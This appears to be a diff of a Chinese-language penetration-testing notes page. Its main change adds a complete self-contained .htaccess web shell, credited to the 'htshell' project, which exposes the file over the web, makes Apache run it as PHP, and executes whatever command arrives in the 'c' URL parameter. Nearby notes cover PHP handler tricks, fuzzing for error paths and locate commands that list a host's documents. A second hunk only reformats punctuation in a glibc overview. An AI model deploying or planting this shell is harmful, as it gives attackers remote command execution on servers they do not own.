@@ -448,7 +448,24 @@
   ForceType application/x-httpd-php
   SetHandler application/x-httpd-php
   <span class="nt">&lt;/Files&gt;</span>
-<span class="p">39.</span>临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
+  3&gt;自解析.htaccess
+    -----------------------自解析.htaccess--------------------------------
+    # Self contained .htaccess web shell - Part of the htshell project
+    # Written by Wireghoul - http://www.justanotherhacker.com<span class="sb">
+
+    # Override default deny rule to make .htaccess file accessible over web
+    &lt;Files ~ "^\.ht"&gt;
+    Order allow,deny
+    Allow from all
+    &lt;/Files&gt;
+
+    # Make .htaccess file be interpreted as php file. This occur after apache has interpreted
+    # the apache directoves from the .htaccess file
+    AddType application/x-httpd-php .htaccess
+
+    ###### SHELL ###### &lt;?php echo "\n";passthru($_GET['c']." 2&gt;&amp;1"); ?&gt;###### LLEHS ######
+    -----------------------自解析.htaccess--------------------------------
+</span><span class="p">39.</span>临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
 <span class="p">40.</span>(command1 &amp; command2)==(command1;command2)    
 command1 &amp;&amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp; command2)或(command1;command2)中如果command1不成功,command1会执行
 locate <span class="ge">*.doc &gt; doc.list &amp;&amp; locate *</span>.docx &gt; docx.list &amp;&amp; locate <span class="ge">*.pdf &gt; pdf.list &amp;&amp; locate *</span>.txt &gt; txt.list &amp;&amp; locate <span class="ge">*.xls &gt; xls.list &amp;&amp; locate *</span>.xlsx &gt; xlsx.list &amp;&amp; locate <span class="ge">*.jpg &gt; jpg.list &amp;&amp; locate *</span>.png &gt; png.list
@@ -2044,22 +2061,22 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
     中,像一个支架一般撑起整个操作系统.在 GNU/Linux 系统中,其C函式库发展史点出了GNU/Linux 演进的几个重要里程碑,
     用glibc 作为系统的C函式库,是GNU/Linux演进的一个重要里程碑.
 
-    glibc除了封装linux操作系统所提供的系统服务外，它本身也提供了许多其它一些必要功能服务的实现，主要的如下：
-    （1）string，字符串处理
-    （2）signal，信号处理
-    （3）dlfcn，管理共享库的动态加载
-    （4）direct，文件目录操作
-    （5）elf，共享库的动态加载器，也即interpreter
-    （6）iconv，不同字符集的编码转换
-    （7）inet，socket接口的实现
-    （8）intl，国际化，也即gettext的实现
-    （9）io
-    （10）linuxthreads
-    （11）locale，本地化
-    （12）login，虚拟终端设备的管理，及系统的安全访问
-    （13）malloc，动态内存的分配与管理
-    （14）nis
-    （15）stdlib，其它基本功能
+    glibc除了封装linux操作系统所提供的系统服务外,它本身也提供了许多其它一些必要功能服务的实现,主要的如下:
+    (1)string,字符串处理
+    (2)signal,信号处理
+    (3)dlfcn,管理共享库的动态加载
+    (4)direct,文件目录操作
+    (5)elf,共享库的动态加载器,也即interpreter
+    (6)iconv,不同字符集的编码转换
+    (7)inet,socket接口的实现
+    (8)intl,国际化,也即gettext的实现
+    (9)io
+    (10)linuxthreads
+    (11)locale,本地化
+    (12)login,虚拟终端设备的管理,及系统的安全访问
+    (13)malloc,动态内存的分配与管理
+    (14)nis
+    (15)stdlib,其它基本功能
 </span></code></pre>
 </div>
 
